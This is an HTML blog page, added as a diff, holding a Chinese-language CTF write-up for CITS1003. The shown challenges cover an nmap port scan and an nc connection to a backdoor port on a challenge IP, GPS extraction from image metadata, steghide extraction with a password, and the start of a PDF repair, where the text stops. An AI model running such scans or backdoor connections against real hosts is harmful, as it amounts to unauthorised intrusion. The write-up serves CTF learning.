@@ -1,0 +1,1257 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CITS1003 CTF wp | 甜筒园</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="CITS1003 CTF wp | 甜筒园">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="CITS1003 CTF[TOC] Emu Hack #1 - Backdoored根据题目描述，在端口61000到61500之间存在一个后门，使用nmap工具进行端口扫描: nmap 34.116.68.59 -p 61000-61550   发现在端口61337存在TCP服务，按照题目要求使用nc连接后发送EMU拿到flag nc 34.116.68.59 61337 EMU   Caffei">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CITS1003 CTF wp">
+<meta property="og:url" content="https://www.ttycp3.top/archives/f8a3bab8.html">
+<meta property="og:site_name" content="甜筒园">
+<meta property="og:description" content="CITS1003 CTF[TOC] Emu Hack #1 - Backdoored根据题目描述，在端口61000到61500之间存在一个后门，使用nmap工具进行端口扫描: nmap 34.116.68.59 -p 61000-61550   发现在端口61337存在TCP服务，按照题目要求使用nc连接后发送EMU拿到flag nc 34.116.68.59 61337 EMU   Caffei">
+<meta property="og:locale">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427185925654.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427190418683.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427194602383.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427194758409.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427195103342.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427200212033.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427200237861.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205355895.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205446268.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205546918.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205715007.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205814892.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205854735.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427210020443.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427210136578.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427215222685.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427230728660.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427230941388.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427232027952.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428085406716.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428085508241.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428084447502.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428143720534.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428103936811.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428104023953.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428104245922.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428142339778.png">
+<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240428142823544.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514145356203.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514145439171.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514151957982.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514152042484.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514171059762.png">
+<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20240514173309181.png">
+<meta property="article:published_time" content="2024-05-09T08:21:59.504Z">
+<meta property="article:modified_time" content="2024-05-14T09:33:11.466Z">
+<meta property="article:author" content="ttycp3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427185925654.png">
+
+
+<link rel="icon" href="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/logo.png">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/gruvbox-dark.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+    <script>        (function(){            var bp = document.createElement('script');            var curProtocol = window.location.protocol.split(':')[0];            if (curProtocol === 'https') {                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';                    }            else {                bp.src = 'http://push.zhanzhang.baidu.com/push.js';            }            var s = document.getElementsByTagName("script")[0];            s.parentNode.insertBefore(bp, s);        })();    </script>  
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="http://q.qlogo.cn/headimg_dl?dst_uin=1004454362&amp;spec=640&amp;img_type=jpg"/>
+</a>
+<div class="author">
+    <span>ttycp3</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://github.com/ttycp3"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="csdn"
+               href="https://blog.csdn.net/qq_33814823"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-csdn"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="neteasemusic"
+               href="https://music.163.com/#/user/home?id=1765543783"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-neteasemusic"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(32)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="Writeup">
+                        
+                        Writeup
+                        <small>(25)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="笔记">
+                        
+                        笔记
+                        <small>(4)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="工具">
+                        
+                        工具
+                        <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="算法竞赛专题">
+                        
+                        算法竞赛专题
+                        <small>(2)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="32">
+<input type="hidden" id="yelog_site_word_count" value="40.6k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">大纲</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>流量分析</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>命令执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>任意文件读取</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>杂项</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>CRLF Injection</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>gopher协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>grafana</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>JAVA安全</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>jwt伪造</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>pickle反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>session反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssrf漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>XPath注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xxe漏洞</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="All Writeup "
+           href="/archives/f8a3bab8.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CITS1003 CTF wp">CITS1003 CTF wp</span>
+            <span class="post-date" title="2024-05-09 16:21:59">2024/05/09</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/e228e2bf.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="XYCTF2024">XYCTF2024</span>
+            <span class="post-date" title="2024-04-28 14:40:53">2024/04/28</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/53f30b58.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NCTF2023web（赛后复现）">NCTF2023web（赛后复现）</span>
+            <span class="post-date" title="2023-12-31 16:31:14">2023/12/31</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/3b79de97.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="SHCTF wp">SHCTF wp</span>
+            <span class="post-date" title="2023-10-02 13:25:28">2023/10/02</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/d4f5203b.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="0xGame2023 wp">0xGame2023 wp</span>
+            <span class="post-date" title="2023-10-01 14:16:22">2023/10/01</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/83697f53.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Moectf2023">Moectf2023</span>
+            <span class="post-date" title="2023-09-16 11:44:15">2023/09/16</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/7a95ce38.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="SYCTF2023wp">SYCTF2023wp</span>
+            <span class="post-date" title="2023-06-10 12:48:24">2023/06/10</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/1d622977.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="第16届ciscn初赛wp">第16届ciscn初赛wp</span>
+            <span class="post-date" title="2023-05-28 18:51:15">2023/05/28</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/7dc07b0.html"
+           data-tag="流量分析,杂项"
+           data-author="" >
+            <span class="post-title" title="第四届闽盾杯Misc流量分析">第四届闽盾杯Misc流量分析</span>
+            <span class="post-date" title="2023-05-25 14:23:16">2023/05/25</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/4524613a.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="ångstromCTF 2023">ångstromCTF 2023</span>
+            <span class="post-date" title="2023-04-25 15:17:57">2023/04/25</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/37321197.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="HDCTF2023">HDCTF2023</span>
+            <span class="post-date" title="2023-04-24 16:30:04">2023/04/24</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/3527c39a.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="第三届红明谷杯">第三届红明谷杯</span>
+            <span class="post-date" title="2023-04-19 14:18:45">2023/04/19</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/6ee431f.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="GDOUCTF2023">GDOUCTF2023</span>
+            <span class="post-date" title="2023-04-16 12:42:03">2023/04/16</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/e92ae896.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="HackPack CTF 2023">HackPack CTF 2023</span>
+            <span class="post-date" title="2023-04-15 16:32:49">2023/04/15</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/c603889a.html"
+           data-tag="pickle反序列化,jwt伪造"
+           data-author="" >
+            <span class="post-title" title="CISCN2019 华北赛区 Day1 ikun">CISCN2019 华北赛区 Day1 ikun</span>
+            <span class="post-date" title="2023-04-12 15:17:10">2023/04/12</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/b85a28bc.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="CTFSHOW第三届愚人杯部分WP">CTFSHOW第三届愚人杯部分WP</span>
+            <span class="post-date" title="2023-04-02 19:28:10">2023/04/02</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/fcef946.html"
+           data-tag="文件上传,任意文件读取,JAVA安全"
+           data-author="" >
+            <span class="post-title" title="GKCTF2021 babycat">GKCTF2021 babycat</span>
+            <span class="post-date" title="2023-04-01 19:45:19">2023/04/01</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/56a79676.html"
+           data-tag="ssrf漏洞"
+           data-author="" >
+            <span class="post-title" title="GYCTF2020 Node Game">GYCTF2020 Node Game</span>
+            <span class="post-date" title="2023-03-21 16:21:32">2023/03/21</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/f06c7905.html"
+           data-tag="ssrf漏洞,gopher协议"
+           data-author="" >
+            <span class="post-title" title="2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl">2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl</span>
+            <span class="post-date" title="2023-03-15 17:45:23">2023/03/15</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/2e3a56ed.html"
+           data-tag="xxe漏洞"
+           data-author="" >
+            <span class="post-title" title="GoogleCTF2019 Quals Bnv">GoogleCTF2019 Quals Bnv</span>
+            <span class="post-date" title="2023-03-15 17:45:23">2023/03/15</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/32149828.html"
+           data-tag="ssrf漏洞,session反序列化,CRLF Injection"
+           data-author="" >
+            <span class="post-title" title="bestphp&#39;s revenge">bestphp&#39;s revenge</span>
+            <span class="post-date" title="2023-03-14 19:17:23">2023/03/14</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/54488cb7.html"
+           data-tag="XPath注入"
+           data-author="" >
+            <span class="post-title" title="Xpath笔记">Xpath笔记</span>
+            <span class="post-date" title="2023-03-11 21:17:23">2023/03/11</span>
+        </a>
+        
+        
+        <a  class="All 算法竞赛专题 "
+           href="/archives/68b41866.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="常用简单模板">常用简单模板</span>
+            <span class="post-date" title="2022-10-23 12:17:23">2022/10/23</span>
+        </a>
+        
+        
+        <a  class="All 算法竞赛专题 "
+           href="/archives/2bd6ac.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="从c升级到c++速成">从c升级到c++速成</span>
+            <span class="post-date" title="2022-10-20 13:47:23">2022/10/20</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/66731dbe.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="NEWSTARCTF2022-Web">NEWSTARCTF2022-Web</span>
+            <span class="post-date" title="2022-10-06 23:53:26">2022/10/06</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/ac4562c6.html"
+           data-tag="命令执行"
+           data-author="" >
+            <span class="post-title" title="ctfshow七夕杯wp">ctfshow七夕杯wp</span>
+            <span class="post-date" title="2022-08-06 17:17:23">2022/08/06</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/ec3e2815.html"
+           data-tag="文件上传"
+           data-author="" >
+            <span class="post-title" title="Webshell笔记">Webshell笔记</span>
+            <span class="post-date" title="2022-05-13 21:17:23">2022/05/13</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/e9530a94.html"
+           data-tag="grafana"
+           data-author="" >
+            <span class="post-title" title="STARCTF2022 oh-my-grafana">STARCTF2022 oh-my-grafana</span>
+            <span class="post-date" title="2022-04-16 23:53:26">2022/04/16</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/1a0e10db.html"
+           data-tag="ssrf漏洞"
+           data-author="" >
+            <span class="post-title" title="SSRF笔记">SSRF笔记</span>
+            <span class="post-date" title="2022-03-30 21:47:23">2022/03/30</span>
+        </a>
+        
+        
+        <a  class="All 笔记 "
+           href="/archives/a00344c6.html"
+           data-tag="sql注入"
+           data-author="" >
+            <span class="post-title" title="SQL注入笔记">SQL注入笔记</span>
+            <span class="post-date" title="2022-03-24 20:17:23">2022/03/24</span>
+        </a>
+        
+        
+        <a  class="All 工具 "
+           href="/archives/7450bfcb.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="实用工具">实用工具</span>
+            <span class="post-date" title="2022-01-24 18:17:23">2022/01/24</span>
+        </a>
+        
+        
+        <a  class="All Writeup "
+           href="/archives/bff3fd5a.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="攻防世界web新手区Writeup">攻防世界web新手区Writeup</span>
+            <span class="post-date" title="2022-01-16 18:17:23">2022/01/16</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-ctf辅导" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">CITS1003 CTF wp</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="Writeup">Writeup</a>
+            
+        </span>
+        
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2024-05-14 17:33:11'>2024-05-09 16:21</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:2k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CITS1003-CTF"><span class="toc-text">CITS1003 CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Hack-1-Backdoored"><span class="toc-text">Emu Hack #1 - Backdoored</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Caffeinated-Emus"><span class="toc-text">Caffeinated Emus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flightless-Data"><span class="toc-text">Flightless Data</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruffled-Feathers"><span class="toc-text">Ruffled Feathers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-in-the-Shell"><span class="toc-text">Emu in the Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Feathered-Forum-Part-1"><span class="toc-text">Feathered Forum - Part 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Apothecary"><span class="toc-text">Emu Apothecary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Advanced-Emu-Standard"><span class="toc-text">Advanced Emu Standard</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Cook-Book"><span class="toc-text">Emu Cook Book</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Casino"><span class="toc-text">Emu Casino</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EWT"><span class="toc-text">EWT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Hack-2-Git-Gud"><span class="toc-text">Emu Hack #2 - Git Gud</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Hack-3-SSH-Tricks"><span class="toc-text">Emu Hack #3 - SSH Tricks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Hack-4-Git-Gud-or-GTFO-Bin"><span class="toc-text">Emu Hack #4 - Git Gud or GTFO Bin</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="CITS1003-CTF"><a href="#CITS1003-CTF" class="headerlink" title="CITS1003 CTF"></a>CITS1003 CTF</h1><p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CITS1003-CTF"><span class="toc-text">CITS1003 CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Hack-1-Backdoored"><span class="toc-text">Emu Hack #1 - Backdoored</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Caffeinated-Emus"><span class="toc-text">Caffeinated Emus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flightless-Data"><span class="toc-text">Flightless Data</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ruffled-Feathers"><span class="toc-text">Ruffled Feathers</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-in-the-Shell"><span class="toc-text">Emu in the Shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Feathered-Forum-Part-1"><span class="toc-text">Feathered Forum - Part 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Apothecary"><span class="toc-text">Emu Apothecary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Advanced-Emu-Standard"><span class="toc-text">Advanced Emu Standard</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Cook-Book"><span class="toc-text">Emu Cook Book</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Casino"><span class="toc-text">Emu Casino</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EWT"><span class="toc-text">EWT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Hack-2-Git-Gud"><span class="toc-text">Emu Hack #2 - Git Gud</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Hack-3-SSH-Tricks"><span class="toc-text">Emu Hack #3 - SSH Tricks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Emu-Hack-4-Git-Gud-or-GTFO-Bin"><span class="toc-text">Emu Hack #4 - Git Gud or GTFO Bin</span></a></li></ol></li></ol></div></p>
+<h2 id="Emu-Hack-1-Backdoored"><a href="#Emu-Hack-1-Backdoored" class="headerlink" title="Emu Hack #1 - Backdoored"></a>Emu Hack #1 - Backdoored</h2><p>根据题目描述，在端口<code>61000</code>到<code>61500</code>之间存在一个后门，使用<code>nmap</code>工具进行端口扫描:</p>
+<pre><code>nmap 34.116.68.59 -p 61000-61550
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427185925654.png" alt="image-20240427185925654"></p>
+<p>发现在端口<code>61337</code>存在TCP服务，按照题目要求使用<code>nc</code>连接后发送<code>EMU</code>拿到flag</p>
+<pre><code>nc 34.116.68.59 61337
+EMU
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427190418683.png" alt="image-20240427190418683"></p>
+<h2 id="Caffeinated-Emus"><a href="#Caffeinated-Emus" class="headerlink" title="Caffeinated Emus"></a>Caffeinated Emus</h2><p>根据提示说图片元数据存在有价值的信息，先右键属性查看没啥特别的：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427194602383.png" alt="image-20240427194602383"></p>
+<p>在这个<a target="_blank" rel="noopener" href="https://aperisolve.fr/">网站</a>对图片分析一下，或者用<code>exiftool</code>工具也可以：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427194758409.png" alt="image-20240427194758409"></p>
+<p>找到GPS定位信息</p>
+<pre><code>31 deg 27&#39; 59.19&quot; S, 119 deg 29&#39; 0.70&quot; E
+</code></pre>
+<p>放到<code>google</code>地图里查一下，找到小镇名字<code>Marvel Loch</code></p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427195103342.png" alt="image-20240427195103342"></p>
+<h2 id="Flightless-Data"><a href="#Flightless-Data" class="headerlink" title="Flightless Data"></a>Flightless Data</h2><p>根据提示是<code>steghide</code>工具的使用</p>
+<p>查看附件<code>email.html</code>，里面有一张<code>jpg</code>图片和一个密码，直接使用改工具进行文件提取:</p>
+<pre><code>steghide extract -sf 111.jpg
+</code></pre>
+<p>回车后输入密码：</p>
+<pre><code>theEMusWiLLRoOld3w0oRlD
+</code></pre>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427200212033.png" alt="image-20240427200212033"></p>
+<p>查看<code>secret.txt</code>拿到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427200237861.png" alt="image-20240427200237861"></p>
+<h2 id="Ruffled-Feathers"><a href="#Ruffled-Feathers" class="headerlink" title="Ruffled Feathers"></a>Ruffled Feathers</h2><p>题目要求是修复PDF,看提示说什么Length,网上查了一下length的计算方法：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205355895.png" alt="image-20240427205355895"></p>
+<p>还有正常<code>PDF</code>的格式大致为：</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205446268.png" alt="image-20240427205446268"></p>
+<p>查看附件内容</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20240427205546918.png" alt="image-20240427205546918"></p>
